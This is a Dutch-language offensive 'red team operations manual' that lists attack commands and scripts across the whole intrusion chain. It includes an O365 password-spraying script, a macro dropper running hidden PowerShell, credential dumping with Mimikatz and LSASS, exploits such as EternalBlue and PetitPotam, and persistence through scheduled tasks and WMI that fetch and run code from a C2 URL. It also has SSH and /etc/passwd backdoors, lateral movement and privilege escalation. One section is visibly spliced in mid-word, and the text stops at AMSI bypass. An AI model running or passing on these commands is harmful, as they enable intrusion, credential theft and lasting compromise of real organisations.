# XPOSE SECURITY — RED TEAM OPERATIONS MANUAL

## Praktische Command Reference & Tooling Guide

**Classificatie:** STRIKT VERTROUWELIJK — Alleen voor geautoriseerde XPOSE operators  
**Versie:** 2.0 | Januari 2026  
**Doel:** Nation-State Level Red Team Operations

---

# INHOUDSOPGAVE

1. [OSINT & Passive Reconnaissance](#1-osint--passive-reconnaissance)
2. [Active Reconnaissance](#2-active-reconnaissance)
3. [Human Reconnaissance (HUMINT)](#3-human-reconnaissance-humint)
4. [Initial Access](#4-initial-access)
5. [Phishing Operations](#5-phishing-operations)
6. [Credential Attacks](#6-credential-attacks)
7. [Exploitation](#7-exploitation)
8. [Post-Exploitation](#8-post-exploitation)
9. [Persistence Mechanisms](#9-persistence-mechanisms)
10. [Lateral Movement](#10-lateral-movement)
11. [Privilege Escalation](#11-privilege-escalation)
12. [Defense Evasion](#12-defense-evasion)
13. [Data Exfiltration](#13-data-exfiltration)
14. [Command & Control](#14-command--control)
15. [Malware Development](#15-malware-development)
16. [Dark Web Intelligence](#16-dark-web-intelligence)
17. [Evilginx Phishlets](#17-evilginx-phishlets)
18. [Complete Attack Chains](#18-complete-attack-chains)

---

# 1. OSINT & PASSIVE RECONNAISSANCE

## 1.1 Domain & Infrastructure Discovery

### Subdomain Enumeration

```bash
# Subfinder - Passive subdomain discovery
subfinder -d target.com -all -o subdomains.txt

# Uitleg: Queryt 40+ passieve bronnen (CT logs, DNS datasets, web archives)
# zonder direct contact met target. Output: lijst van subdomains.
```

```bash
# Amass - Comprehensive OSINT
amass enum -passive -d target.com -o amass_passive.txt

# Uitleg: Amass is de meest complete OSINT tool. -passive flag zorgt
# ervoor dat er geen DNS queries naar target gaan.
```

```bash
# Combineer resultaten
cat subdomains.txt amass_passive.txt | sort -u | httpx -silent -o live_subdomains.txt

# Uitleg: Dedupliceer en check welke subdomains live zijn.
```

### Certificate Transparency

```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Uitleg: CT logs bevatten alle SSL certificaten. Volledig passief.
```

## 1.2 Email & Employee Discovery

```bash
# Hunter.io
curl -s "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=$KEY" | jq

# theHarvester
theHarvester -d target.com -b all -f output

# CrossLinked (LinkedIn zonder login)
python3 crosslinked.py -f '{first}.{last}@target.com' "Company" -o employees.txt
```

## 1.3 Credential Leak Discovery

```bash
# Dehashed API
curl -s "https://api.dehashed.com/search?query=domain:target.com" -u "$EMAIL:$KEY"

# Intelligence X
curl -s "https://2.intelx.io/intelligent/search" -H "x-key: $KEY" -d '{"term":"target.com"}'
```

## 1.4 Technology Fingerprinting

```bash
# Shodan
shodan host 1.2.3.4
shodan search "ssl.cert.subject.cn:target.com"

# Cloud enum
python3 cloud_enum.py -k target -k targetcompany
```

---

# 2. ACTIVE RECONNAISSANCE

## 2.1 Port Scanning

```bash
# Nmap - Quick scan
nmap -sT -T4 --top-ports 1000 -oA quick target.com

# Nmap - Full scan
nmap -sT -T4 -p- -oA full target.com

# Nmap - Version detection
nmap -sV -sC -p 22,80,443,445,3389 target.com

# Masscan - Speed
masscan -p1-65535 --rate 10000 192.168.1.0/24 -oJ results.json

# RustScan
rustscan -a target.com --ulimit 5000 -- -sV -sC
```

## 2.2 Service Enumeration

```bash
# Web scanning
nikto -h https://target.com
nuclei -u https://target.com -t nuclei-templates/
ffuf -u https://target.com/FUZZ -w wordlist.txt

# SMB
crackmapexec smb target.com -u '' -p '' --shares
smbmap -H target.com

# LDAP
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"
```

---

# 3. HUMAN RECONNAISSANCE

## 3.1 Target Profiling

```python
#!/usr/bin/env python3
"""employee_profiler.py - Prioritize targets for social engineering"""

HIGH_VALUE_TITLES = ["IT", "Security", "Admin", "Helpdesk", "Finance", "HR", "Executive"]

def score_target(title):
    return sum(20 for t in HIGH_VALUE_TITLES if t.lower() in title.lower())

def suggest_angles(title):
    angles = []
    if "IT" in title: angles.extend(["Vendor impersonation", "Job offer"])
    if "HR" in title: angles.append("Malicious resume")
    if "Finance" in title: angles.append("Invoice fraud")
    return angles
```

## 3.2 Physical Recon Checklist

- [ ] Google Maps/Street View
- [ ] Building entrances
- [ ] Badge systems
- [ ] Security guards
- [ ] WiFi networks
- [ ] Tailgating opportunities

---

# 4. INITIAL ACCESS

## 4.1 Password Spraying

```bash
# O365 Spray
python3 MSOLSpray.py --userlist users.txt --password "Summer2024!"

# Timing: 1 password per 30-60 minutes to avoid lockout
```

```python
#!/usr/bin/env python3
"""smart_spray.py - Lockout-aware O365 spraying"""

import requests, time, random

def check_o365(email, password):
    r = requests.post("https://login.microsoftonline.com/common/oauth2/token",
        data={"grant_type": "password", "username": email, "password": password,
              "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
              "resource": "https://graph.microsoft.com"})
    return r.status_code == 200

def spray(users, password):
    for user in users:
        if check_o365(user, password):
            print(f"[+] VALID: {user}:{password}")
        time.sleep(random.uniform(0.5, 2.0))

COMMON_PASSWORDS = [
    "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
    "Welcome1!", "Password1!", "Welkom01!", "Company2024!"
]
```

## 4.2 VPN Exploitation

```bash
# Check Fortinet CVE-2024-21762
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../../dev/cmdb/sslvpn_websession"

# Check Ivanti CVE-2024-21887
curl -k "https://vpn.target.com/api/v1/totp/user-backup-code/../../license/keys-status/%3Bid"

# Exploitation: REDACTED - Use authorized tools only
```

---

# 5. PHISHING OPERATIONS

## 5.1 Infrastructure Setup

```bash
# GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip && cd gophish

# SSL certs
certbot certonly --standalone -d phish.attacker.com
./gophish
```

## 5.2 Email Templates

### IT Password Reset
```html
<h2>Password Expiration Notice</h2>
<p>Dear {{.FirstName}},</p>
<p>Your password expires in <strong>24 hours</strong>.</p>
<a href="{{.URL}}" style="background:#0078d4;color:white;padding:15px 30px;">
    Update Password
</a>
```

### SharePoint Document
```html
<p><strong>{{.SenderName}}</strong> shared a document:</p>
<div style="background:#f3f2f1;padding:15px;">📄 {{.DocumentName}}</div>
<a href="{{.URL}}" style="background:#0078d4;color:white;padding:12px;">Open</a>
```

### Callback Phishing (BazarCall)
```html
<h2>Order Confirmation - ${{.Amount}}</h2>
<p>Didn't authorize? Call: <strong style="color:red;">{{.PhoneNumber}}</strong></p>
<!-- No links! Victim calls, then social engineer to install remote access -->
```

## 5.3 VBA Macro Template

```vba
Sub AutoOpen()
    If Not IsSandbox() Then ExecutePayload
End Sub

Function IsSandbox() As Boolean
    ' Check RAM < 4GB
    ' Check processors < 2
    ' Check for analyst usernames
    IsSandbox = False
End Function

Sub ExecutePayload()
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -c ""IEX(...)"" "
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

---

# 6. CREDENTIAL ATTACKS

## 6.1 Mimikatz

```powershell
# Dump LSASS
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /all /csv"'

# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Admin /domain:target.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"'

# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

## 6.2 LSASS Dumping

```powershell
# Via comsvcs.dll (native Windows)
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\l.dmp full

# Analyze offline
mimikatz.exe "sekurlsa::minidump l.dmp" "sekurlsa::logonpasswords"
```

## 6.3 Password Cracking

```bash
# NTLM
hashcat -m 1000 hashes.txt rockyou.txt

# Kerberoast
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# NetNTLMv2
hashcat -m 5600 netntlm.txt rockyou.txt
```


---

eros 23 - RC4)
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# Uitleg: Kerberoast hashes zijn trager maar vaak
# service accounts hebben zwakke wachtwoorden.
```

```bash
# AS-REP (Kerberos 18)
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Uitleg: AS-REP is sneller te kraken dan Kerberoast.
```

```bash
# Rules-based attack
hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule

# Uitleg: Rules muteren wordlist entries:
# password → Password, Password1, Password!, p4ssw0rd
# Verhoogt success rate significant.
```

```bash
# Mask attack (bruteforce met patterns)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s

# Uitleg: ?u=uppercase ?l=lowercase ?d=digit ?s=special
# Dit pattern: Abcde123! (8 chars, common pattern)
```

```bash
# Combinator attack
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Uitleg: Combineert woorden uit twee wordlists.
# company + 2024 = company2024
```

### John the Ripper

```bash
# Basic crack
john --format=NT hashes.txt --wordlist=rockyou.txt

# Uitleg: John ondersteunt meer hash types out of the box.
# NT = NTLM, kan ook auto-detect proberen.
```

```bash
# Show cracked passwords
john --show hashes.txt

# Incremental mode (brute force)
john --format=NT hashes.txt --incremental

# Rules
john --format=NT hashes.txt --wordlist=rockyou.txt --rules=All
```

---

# 7. EXPLOITATION

## 7.1 Windows Exploitation

### PrintNightmare (CVE-2021-34527)

```powershell
# Check vulnerability
Get-Service Spooler | Select-Object Status

# Als Spooler running en niet gepatched → kwetsbaar

# Exploitation via Mimikatz
misc::printnightmare /library:\\attacker\share\evil.dll /server:dc01.target.local

# Of met Python
# REDACTED: Use impacket's CVE-2021-1675.py

# Uitleg: PrintNightmare exploiteert de Print Spooler service.
# Laadt een malicious DLL met SYSTEM privileges.
# Kan remote worden geëxploiteerd naar Domain Controllers.
```

### Zerologon (CVE-2020-1472)

```bash
# Check vulnerability
python3 zerologon_tester.py DC01 192.168.1.10

# Exploitation
# REDACTED - Changes DC machine account password to empty
# Use secretsdump.py to extract credentials after

# WAARSCHUWING: Zerologon kan DC instabiliteit veroorzaken!
# Alleen gebruiken na expliciete goedkeuring.

# Uitleg: Zerologon exploiteert een flaw in Netlogon protocol.
# Stelt machine account password in op leeg.
# Geeft onmiddellijke DA-level access maar kan DC breken.
```

### PetitPotam

```bash
# Force authentication from DC to attacker
python3 PetitPotam.py -d target.local -u user -p password attacker_ip dc_ip

# Relay naar AD CS voor DC certificate
ntlmrelayx.py -t https://ca.target.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Uitleg: PetitPotam forceert NTLM auth van DC naar attacker.
# Relay naar ADCS voor certificate = persistent DA access.
# Zeer krachtige attack chain.
```

### MS17-010 (EternalBlue)

```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms17-010 target

# Exploitation via Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker
run

# Uitleg: EternalBlue is nog steeds relevant op legacy systemen.
# Geeft SYSTEM shell via SMB.
# Vaak gevonden op Windows 7, Server 2008 systemen.
```

## 7.2 Active Directory Attacks

### BloodHound Collection

```powershell
# SharpHound collection
.\SharpHound.exe -c All -d target.local --zipfilename bloodhound.zip

# Of met PowerShell versie
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# Uitleg: BloodHound verzamelt AD info:
# - Users, groups, computers
# - Group memberships
# - Local admin rights
# - Session information
# - ACLs en permissions

# Importeer bloodhound.zip in BloodHound GUI
# Zoek naar paths naar Domain Admin
```

### AD CS Attacks (Certified Pre-Owned)

```bash
# Enumerate AD CS misconfigurations
certipy find -u user@target.local -p 'password' -dc-ip 192.168.1.10

# ESC1 - Misconfigured certificate template
certipy req -u user@target.local -p 'password' -ca CORP-CA -template VulnTemplate -upn administrator@target.local

# ESC8 - NTLM relay to web enrollment
ntlmrelayx.py -t http://ca.target.local/certsrv/certfnsh.asp -smb2support --adcs

# Uitleg: AD CS misconfigurations zijn zeer common.
# ESC1-ESC8 zijn verschillende attack vectors.
# Kan leiden tot domein compromise via certificates.
```

### Resource-Based Constrained Delegation

```powershell
# Check voor computer account creation rights
Get-DomainObject -Identity "dc=target,dc=local" -Properties ms-DS-MachineAccountQuota

# Maak computer account
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Configure RBCD
Set-ADComputer target-server -PrincipalsAllowedToDelegateToAccount FAKE01$

# Krijg service ticket
.\Rubeus.exe s4u /user:FAKE01$ /rc4:[HASH] /impersonateuser:administrator /msdsspn:cifs/target-server.target.local /ptt

# Uitleg: RBCD attack flow:
# 1. Maak fake computer account (default: 10 allowed)
# 2. Configure delegation naar target
# 3. Request ticket als Administrator
# Zeer effectieve privesc techniek.
```

## 7.3 Linux Exploitation

### Sudo Exploits

```bash
# Check sudo version
sudo --version

# CVE-2021-3156 (Baron Samedit) - Heap overflow
# Versies < 1.9.5p2
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# Exploitation
# REDACTED: Use public POC exploits

# Uitleg: Baron Samedit is een heap-based buffer overflow.
# Leidt tot root privilege escalation.
# Check versie en gebruik POC indien kwetsbaar.
```

### Kernel Exploits

```bash
# Dirty COW (CVE-2016-5195)
# Oudere kernels < 4.8.3

# Check kernel versie
uname -r

# Compileer exploit
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

# Uitleg: Dirty COW exploiteert een race condition in copy-on-write.
# Geeft write access tot read-only memory.
# Kan /etc/passwd modificeren voor root access.
```

```bash
# Dirty Pipe (CVE-2022-0847)
# Kernels 5.8 - 5.16.11

# Check vulnerability
cat /proc/version

# Compile en run
gcc exploit.c -o exploit
./exploit

# Uitleg: Dirty Pipe kan arbitrary files overschrijven.
# Kan /etc/passwd modificeren voor instant root.
```

---

# 8. POST-EXPLOITATION

## 8.1 Situational Awareness

### Windows Enumeration

```powershell
# System info
systeminfo
hostname
whoami /all

# Network info
ipconfig /all
netstat -ano
route print
arp -a

# Users en groups
net user
net localgroup administrators
net user /domain
net group "Domain Admins" /domain

# Processen en services
tasklist /v
Get-Process
Get-Service

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Security software
Get-MpComputerStatus  # Windows Defender
Get-Process | Where-Object {$_.ProcessName -match "McAfee|Norton|Kaspersky|Trend|Symantec|CrowdStrike|Carbon|Cylance|SentinelOne"}

# Scheduled tasks
schtasks /query /fo LIST /v

# Startup items
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Uitleg: Dit zijn de eerste commands na initial access.
# Begrijp de omgeving voordat je verder gaat.
```

### Linux Enumeration

```bash
# System info
uname -a
cat /etc/os-release
hostname

# Current user
whoami
id
sudo -l

# Network
ifconfig -a  # of ip a
netstat -tulpn
cat /etc/resolv.conf

# Users
cat /etc/passwd
cat /etc/shadow  # als root
cat /etc/group

# Running processes
ps aux
ps -ef

# Cronjobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Interesting files
find / -name "*.conf" 2>/dev/null
find / -name "*.log" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
```

## 8.2 Data Discovery

### Windows Data Discovery

```powershell
# Find password files
dir /s /p *pass*.txt
dir /s /p *password*
dir /s /p *.kdbx  # KeePass
dir /s /p *.pfx   # Certificates
dir /s /p *.ppk   # PuTTY keys

# Search file contents
findstr /si password *.txt *.xml *.config *.ini

# PowerShell search
Get-ChildItem -Path C:\ -Include *password*,*credential*,*secret* -Recurse -ErrorAction SilentlyContinue

# Browser credentials
# Chrome
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $chrome "$env:TEMP\chrome_logins"

# Firefox
$firefox = "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
Copy-Item $firefox "$env:TEMP\"

# Uitleg: Data discovery identificeert high-value files.
# Credentials, certificates, keys zijn prioriteit.
```

```powershell
# SharePoint/OneDrive enumeration
Get-ChildItem "$env:USERPROFILE\OneDrive*" -Recurse -Include *.xlsx,*.docx,*.pdf | Select-Object FullName

# Outlook emails
# PST files bevatten vaak gevoelige info
dir /s /p *.pst *.ost

# Network shares
net view \\dc01
net view /domain
Get-SmbShare
```

### Database Discovery

```powershell
# SQL Server discovery
Import-Module SQLPS
Get-SqlDatabase -ServerInstance "sql.target.local"

# Of met PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLDatabase

# Uitleg: PowerUpSQL is specifiek voor SQL Server enumeration en exploitation.
```

```bash
# MySQL
mysql -u root -p -e "SHOW DATABASES; SHOW TABLES;"

# PostgreSQL
psql -U postgres -c "\l"  # list databases
psql -U postgres -d dbname -c "\dt"  # list tables

# MongoDB
mongo --eval "db.adminCommand('listDatabases')"
```

## 8.3 Credential Harvesting

### Windows Credential Locations

```powershell
# Credential Manager
cmdkey /list
rundll32 keymgr.dll,KRShowKeyMgr

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Saved RDP credentials
dir %userprofile%\AppData\Local\Microsoft\Credentials
dir %userprofile%\AppData\Roaming\Microsoft\Credentials

# Web browser credentials (via tools)
.\SharpChromium.exe logins
.\SharpWeb.exe all

# Outlook/email credentials
# Mimikatz kan Outlook passwords extracten indien gecached
```

```powershell
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Uitleg: AutoLogon slaat credentials plaintext op in registry.
# Zeer common op kiosk machines en sommige servers.
```

### Service Account Credentials

```powershell
# Unattended install files
dir C:\Windows\Panther\Unattend* /s
dir C:\Windows\System32\sysprep\* /s
type C:\Windows\Panther\Unattend.xml

# Group Policy Preferences
# cpassword kan worden gedecrypt
dir \\dc\SYSVOL\domain\Policies\*\*\Preferences\*\*.xml /s

# Decrypt GPP password
# REDACTED - Use gpp-decrypt tool

# Uitleg: GPP passwords gebruiken bekende AES key.
# Microsoft published de key - volledig reversible.
```

---

# 9. PERSISTENCE MECHANISMS

## 9.1 Windows Persistence

### Registry Run Keys

```powershell
# User level (no admin needed)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe"

# System level (admin required)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /t REG_SZ /d "C:\Windows\System32\payload.exe"

# Uitleg: Run keys executeren bij elke login.
# HKCU = user level, HKLM = all users.
# Zeer simpel maar ook makkelijk te detecteren.
```

### Scheduled Tasks

```powershell
# Create scheduled task
schtasks /create /tn "Microsoft\Windows\Security\SecurityHealthCheck" /tr "C:\Windows\System32\payload.exe" /sc hourly /mo 1 /ru SYSTEM

# PowerShell variant
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c `"IEX((New-Object Net.WebClient).DownloadString('[C2_URL]'))`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Principal $principal

# Uitleg: Scheduled tasks zijn krachtige persistence.
# Kunnen draaien als SYSTEM.
# Veel legit taken → makkelijk te verbergen.
```

### Windows Services

```powershell
# Create malicious service
sc create "WindowsSecurityManager" binpath= "cmd.exe /c C:\Windows\System32\payload.exe" start= auto
sc start "WindowsSecurityManager"

# Of via PowerShell
New-Service -Name "WindowsSecurityManager" -BinaryPathName "C:\Windows\System32\payload.exe" -StartupType Automatic

# Uitleg: Services draaien als SYSTEM by default.
# Start automatisch bij boot.
# Meer betrouwbaar dan scheduled tasks.
```

### WMI Event Subscriptions

```powershell
# Create WMI persistence
$filterName = "SecurityFilter"
$consumerName = "SecurityConsumer"

# Event filter (trigger)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Event consumer (action)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c `"IEX((New-Object Net.WebClient).DownloadString('[C2_URL]'))`""
}

# Binding
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Uitleg: WMI persistence is zeer stealthy.
# Geen files op disk (alleen WMI database).
# Triggert elke 60 seconden in dit voorbeeld.
```

### DLL Hijacking

```powershell
# Zoek naar DLL hijack opportunities
# Procmon gebruiken om LoadLibrary fails te vinden
# Of gebruik tools zoals DLLSpy

# Common locations:
# C:\Windows\System32\version.dll
# C:\Windows\System32\wbem\wbemcomn.dll
# Path directories (PATH environment variable)

# Uitleg: Als een applicatie een DLL zoekt in een writable locatie,
# plaats dan malicious DLL met dezelfde naam.
# Legitieme applicatie laadt en executeert je code.
```

## 9.2 Linux Persistence

### Cron Jobs

```bash
# User cron
crontab -e
# Add: */5 * * * * /tmp/.hidden/beacon.sh

# System cron
echo "*/5 * * * * root /tmp/.hidden/beacon.sh" >> /etc/crontab

# Cron directory
cp beacon.sh /etc/cron.hourly/security-check
chmod +x /etc/cron.hourly/security-check

# Uitleg: Cron is de standaard persistence voor Linux.
# /etc/cron.* directories voeren scripts uit op interval.
```

### SSH Keys

```bash
# Add public key voor persistent access
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@attack" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Uitleg: SSH key access is zeer stealthy.
# Geen wachtwoord nodig, moeilijk te detecteren.
# Blijft werken zelfs als wachtwoord wordt gereset.
```

### Systemd Services

```bash
# Create malicious service
cat > /etc/systemd/system/security-update.service << 'EOF'
[Unit]
Description=Security Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/security-update
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable security-update
systemctl start security-update

# Uitleg: Systemd services zijn de moderne manier voor services.
# Automatische restart, start bij boot.
# Legitiem uitziende service naam.
```

### Bashrc/Profile Injection

```bash
# Inject in user's bashrc
echo 'nohup /tmp/.hidden/beacon &' >> ~/.bashrc

# Of voor alle users
echo 'nohup /tmp/.hidden/beacon &' >> /etc/profile

# Uitleg: Executeert elke keer dat user een terminal opent.
# Minder betrouwbaar (user moet inloggen).
```

---

# 10. LATERAL MOVEMENT

## 10.1 Windows Lateral Movement

### PsExec

```powershell
# Sysinternals PsExec
.\PsExec.exe \\target -u domain\admin -p password cmd.exe

# Impacket psexec
psexec.py domain/admin:password@target

# Met hash
psexec.py -hashes :NTLMHASH domain/admin@target

# Uitleg: PsExec maakt een service aan op remote machine.
# Uploadt executable, voert uit, en verwijdert.
# Relatief noisy maar very reliable.
```

### WMI

```powershell
# WMI command execution
wmic /node:target /user:admin /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -w hidden -c [COMMAND]" -ComputerName target -Credential $cred

# Impacket wmiexec
wmiexec.py domain/admin:password@target

# Uitleg: WMI laat geen files achter op disk.
# Gebruikt DCOM protocol.
# Minder gelogd dan PsExec.
```

### WinRM

```powershell
# Enable WinRM (als admin op target)
Enable-PSRemoting -Force

# Connect via WinRM
Enter-PSSession -ComputerName target -Credential (Get-Credential)

# Remote command execution
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred

# Impacket
evil-winrm -i target -u admin -p password

# Uitleg: WinRM is het standaard remote management protocol.
# Encrypted, gebruikt port 5985/5986.
# Makkelijk te gebruiken, relatief quiet.
```

### RDP

```powershell
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes

# RDP Hijacking (SYSTEM required)
# Maak verbinding met actieve sessie zonder wachtwoord
query user
tscon <SESSION_ID> /dest:rdp-tcp#0

# Uitleg: RDP is interactive maar logged.
# RDP Hijacking kan bestaande sessies overnemen.
# Nuttig voor access to GUI applications.
```

### SMB/Admin Shares

```powershell
# Copy files via admin shares
copy payload.exe \\target\C$\Windows\Temp\

# Mount share
net use Z: \\target\C$ /user:domain\admin password

# Execute via scheduled task
schtasks /create /s target /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00 /ru SYSTEM /u admin /p password
schtasks /run /s target /tn "Updater" /u admin /p password

# Uitleg: Admin shares (C$, ADMIN$) geven file access.
# Combineer met scheduled task voor code execution.
```

## 10.2 Linux Lateral Movement

### SSH

```bash
# With password
ssh user@target

# With key
ssh -i id_rsa user@target

# SSH tunneling for pivoting
ssh -D 9050 user@target  # SOCKS proxy
ssh -L 3389:internal:3389 user@target  # Local port forward

# Uitleg: SSH is de standaard voor Linux lateral movement.
# Tunneling maakt pivoting mogelijk naar internal networks.
```

### SSH Agent Hijacking

```bash
# Find SSH agent sockets
find /tmp -name "agent*" 2>/dev/null

# Hijack agent
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.XXX ssh user@target

# Uitleg: SSH agent houdt private keys in memory.
# Als je access hebt tot de socket, kun je de keys gebruiken.
# Geen wachtwoord/key file nodig.
```

---

# 11. PRIVILEGE ESCALATION

## 11.1 Windows PrivEsc

### Local Privilege Escalation Checklist

```powershell
# Automated enumeration
.\winPEAS.exe
.\Seatbelt.exe -group=all
.\PowerUp.ps1; Invoke-AllChecks

# Manual checks

# 1. Service misconfigurations
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
# Unquoted paths with spaces = privesc

# 2. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1 means MSI installs as SYSTEM

# 3. Stored credentials
cmdkey /list
# Saved creds kunnen worden gebruikt met runas

# 4. Weak service permissions
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# Als we service kunnen modificeren → privesc

# 5. Unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Autounattend.xml

# 6. SAM/SYSTEM readable
dir C:\Windows\Repair\SAM
# Als readable → extract hashes
```

### Token Impersonation

```powershell
# Check voor SeImpersonatePrivilege
whoami /priv

# Potato attacks (als SeImpersonate aanwezig)
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# Uitleg: Service accounts hebben vaak SeImpersonatePrivilege.
# Potato exploits misbruiken dit voor SYSTEM.
# IIS, SQL Server, etc. zijn vaak kwetsbaar.
```

### UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

# Fodhelper bypass (Windows 10)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c start powershell.exe" /f
fodhelper.exe

# Uitleg: UAC bypass verhoogt van medium naar high integrity.
# Werkt alleen als user in Administrators groep zit.
# Veel bypass techniques beschikbaar.
```

## 11.2 Linux PrivEsc

### Enumeration

```bash
# Automated
./linpeas.sh
./linux-exploit-suggester.sh

# Manual

# 1. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins voor exploitation

# 2. Sudo rights
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → shell escape

# 3. Writable /etc/passwd
ls -la /etc/passwd
# Als writable, voeg root user toe

# 4. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# Writable scripts die als root draaien

# 5. Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep op python → privesc

# 6. Kernel version
uname -r
# Check voor kernel exploits
```

### Common PrivEsc Techniques

```bash
# SUID binary exploitation (voorbeeld: find)
find . -exec /bin/sh -p \;

# Sudo abuse (voorbeeld: vim)
sudo vim -c '!sh'

# Writable /etc/passwd
# Generate password hash
openssl passwd -1 newpassword
# Add to /etc/passwd
echo 'backdoor:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Cron job abuse
# Als cron draait script in writable directory:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/script.sh
# Wacht op cron, dan:
/tmp/bash -p

# Capabilities (python3 met cap_setuid)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 12. DEFENSE EVASION

## 12.1 AMSI Bypass

```powershell
# Basic AMSI bypass (wordt vaak gedetecteerd)
